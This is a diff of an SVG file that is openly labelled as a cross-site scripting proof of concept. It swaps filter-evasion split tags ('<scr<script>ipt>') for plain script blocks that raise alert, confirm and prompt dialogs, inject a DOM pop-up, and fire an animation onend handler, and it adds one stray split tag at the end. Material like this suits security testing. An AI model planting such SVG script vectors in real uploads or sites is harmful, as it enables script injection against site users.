@@ -17,26 +17,26 @@
     <text x="300" y="50" font-size="20" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Multiple Alerts (Click or Wait)</text>
     
     <!-- Technique 1: Standard Alert (Immediate) -->
-    <scr<script>ipt>
+    <script>
         alert('XSS PoC: Standard alert triggered on load');
-    </scr</script>ipt>
+    </script>
     
     <!-- Technique 2: Confirm Dialog (After 2 seconds) -->
-    <scr<script>ipt>
+    <script>
         setTimeout(() => {
             confirm('XSS PoC: Confirm dialog - click OK or Cancel');
         }, 2000);
-    </sc</script>ript>
+    </script>
     
     <!-- Technique 3: Prompt Dialog (After 4 seconds) -->
-    <scr<script>ipt>
+    <script>
         setTimeout(() => {
             prompt('XSS PoC: Prompt dialog - enter text', 'Type here');
         }, 4000);
-    </sc</script>ript>
+    </script>
     
     <!-- Technique 4: Custom DOM-Based Pop-Up (After 6 seconds) -->
-    <scr<script>ipt>
+    <script>
         setTimeout(() => {
             const popup = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
             popup.setAttribute('x', '150');
@@ -52,7 +52,7 @@
             popup.appendChild(div);
             document.querySelector('svg').appendChild(popup);
         }, 6000);
-    </scr</script>ipt>
+    </script>
     
     <!-- Technique 5: ForeignObject with HTML Pop-Up (After 8 seconds) -->
     <foreignObject x="150" y="220" width="300" height="100">
@@ -78,4 +78,5 @@
     <circle cx="50" cy="50" r="20" fill="red">
         <animate attributeName="r" from="20" to="30" dur="2s" begin="10s" fill="freeze" onend="alert('XSS PoC: Animation onend triggered');" />
     </circle>
+<scr<script>ipt>
 </svg>
